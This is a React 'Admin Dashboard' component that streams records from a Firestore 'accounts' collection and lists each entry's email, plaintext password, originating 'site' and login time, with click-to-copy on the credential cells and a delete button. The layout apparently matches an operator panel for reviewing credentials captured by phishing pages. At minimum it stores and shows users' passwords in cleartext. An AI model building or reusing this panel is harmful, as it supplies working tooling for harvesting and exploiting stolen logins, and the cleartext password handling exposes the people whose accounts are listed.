import { useEffect, useState } from "react";
import { db } from "../../utils/firebase";
import {
  collection,
  onSnapshot,
  query,
  orderBy,
  deleteDoc,
  doc,
} from "firebase/firestore";

export default function AdminPage() {
  const [users, setUsers] = useState([]);
  const [search, setSearch] = useState("");
  const [filteredUsers, setFilteredUsers] = useState([]);
  const [currentPage, setCurrentPage] = useState(1);
  const [usersPerPage] = useState(5);

  useEffect(() => {
    const usersRef = collection(db, "accounts");
    const q = query(usersRef, orderBy("loginAt", "desc"));

    const unsubscribe = onSnapshot(q, (snapshot) => {
      const userData = snapshot.docs.map((doc) => ({
        id: doc.id,
        ...doc.data(),
        loginAt: doc.data().loginAt?.toDate()?.toLocaleString() || "N/A",
      }));
      setUsers(userData);
      setFilteredUsers(userData); // Initialize with all users
    });

    return () => unsubscribe(); // Cleanup listener on component unmount
  }, []);

  const handleSearch = (e) => {
    const value = e.target.value.toLowerCase();
    setSearch(value);
    const filtered = users.filter(
      (user) =>
        user.email.toLowerCase().includes(value) ||
        user.site.toLowerCase().includes(value)
    );
    setFilteredUsers(filtered);
    setCurrentPage(1);
  };

  const indexOfLastUser = currentPage * usersPerPage;
  const indexOfFirstUser = indexOfLastUser - usersPerPage;
  const currentUsers = filteredUsers.slice(indexOfFirstUser, indexOfLastUser);

  const totalPages = Math.ceil(filteredUsers.length / usersPerPage);

  const handlePageChange = (page) => {
    if (page > 0 && page <= totalPages) {
      setCurrentPage(page);
    }
  };

  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text).then(
      () => {
        alert("Copied to clipboard!");
      },
      (err) => {
        console.error("Failed to copy text: ", err);
      }
    );
  };

  const handleDelete = (id) => {
    console.log(`Delete user with id: ${id}`);
    deleteDoc(doc(db, "accounts", id));
  };

  return (
    <div style={styles.container}>
      <h1 style={styles.heading}>Admin Dashboard</h1>
      <div style={styles.searchContainer}>
        <input
          type="text"
          placeholder="Search by email or site..."
          value={search}
          onChange={handleSearch}
          style={styles.searchBar}
        />
      </div>
      <div style={styles.tableWrapper}>
        <table style={styles.table}>
          <thead>
            <tr>
              <th style={styles.th}>Email</th>
              <th style={styles.th}>Password</th>
              <th style={styles.th}>Site</th>
              <th style={styles.th}>Login At</th>
              <th style={styles.th}>Actions</th> {/* Added Actions column */}
            </tr>
          </thead>
          <tbody>
            {currentUsers.map((user) => (
              <tr key={user.id}>
                <td
                  style={styles.td}
                  onClick={() => copyToClipboard(user.email)}
                >
                  {user.email}
                </td>
                <td
                  style={styles.td}
                  onClick={() => copyToClipboard(user.password)}
                >
                  {user.password}
                </td>
                <td style={styles.td}>{user.site}</td>
                <td style={styles.td}>{user.loginAt}</td>
                <td style={styles.td}>
                  <button
                    onClick={() => handleDelete(user.id)}
                    style={styles.deleteButton}
                  >
                    Delete
                  </button>
                </td>
              </tr>
            ))}
          </tbody>
        </table>
        {currentUsers.length === 0 && (
          <p style={styles.noDataText}>No results found.</p>
        )}
      </div>
      <div style={styles.pagination}>
        <button
          onClick={() => handlePageChange(currentPage - 1)}
          disabled={currentPage === 1}
          style={styles.paginationButton}
        >
          Previous
        </button>
        {Array.from({ length: totalPages }, (_, i) => (
          <button
            key={i + 1}
            onClick={() => handlePageChange(i + 1)}
            style={{
              ...styles.paginationButton,
              backgroundColor: currentPage === i + 1 ? "#333" : "#fff",
              color: currentPage === i + 1 ? "#fff" : "#333",
            }}
          >
            {i + 1}
          </button>
        ))}
        <button
          onClick={() => handlePageChange(currentPage + 1)}
          disabled={currentPage === totalPages}
          style={styles.paginationButton}
        >
          Next
        </button>
      </div>
    </div>
  );
}

// Styles
const styles = {
  container: {
    margin: "20px auto",
    padding: "20px",
    fontFamily: "'Roboto', sans-serif",
    maxWidth: "900px",
    color: "#333",
    backgroundColor: "#f9f9f9",
    borderRadius: "8px",
    boxShadow: "0px 4px 6px rgba(0, 0, 0, 0.1)",
  },
  heading: {
    textAlign: "center",
    fontSize: "28px",
    fontWeight: "bold",
    color: "#333",
    marginBottom: "20px",
  },
  searchContainer: {
    textAlign: "center",
    marginBottom: "20px",
  },
  searchBar: {
    width: "80%",
    padding: "12px 15px",
    fontSize: "16px",
    borderRadius: "8px",
    border: "1px solid #ddd",
    outline: "none",
    transition: "border-color 0.3s ease",
  },
  tableWrapper: {
    overflowX: "auto",
  },
  table: {
    width: "100%",
    borderCollapse: "collapse",
    backgroundColor: "#fff",
    borderRadius: "8px",
    overflow: "hidden",
    boxShadow: "0px 4px 6px rgba(0, 0, 0, 0.1)",
  },
  th: {
    backgroundColor: "#333",
    color: "#fff",
    textAlign: "left",
    padding: "12px 15px",
    fontWeight: "bold",
    fontSize: "16px",
    borderBottom: "1px solid #ddd",
  },
  td: {
    padding: "12px 15px",
    fontSize: "15px",
    borderBottom: "1px solid #ddd",
    textAlign: "left",
    cursor: "pointer", // Indicate the text is clickable
  },
  pagination: {
    display: "flex",
    justifyContent: "center",
    alignItems: "center",
    gap: "10px",
    marginTop: "20px",
  },
  paginationButton: {
    padding: "8px 12px",
    fontSize: "14px",
    borderRadius: "5px",
    border: "1px solid #ddd",
    backgroundColor: "#fff",
    cursor: "pointer",
    transition: "background-color 0.3s ease",
  },
  noDataText: {
    textAlign: "center",
    fontSize: "16px",
    color: "#666",
    marginTop: "20px",
  },
  deleteButton: {
    padding: "6px 12px",
    fontSize: "14px",
    backgroundColor: "#f44336",
    color: "#fff",
    border: "none",
    borderRadius: "5px",
    cursor: "pointer",
  },
};
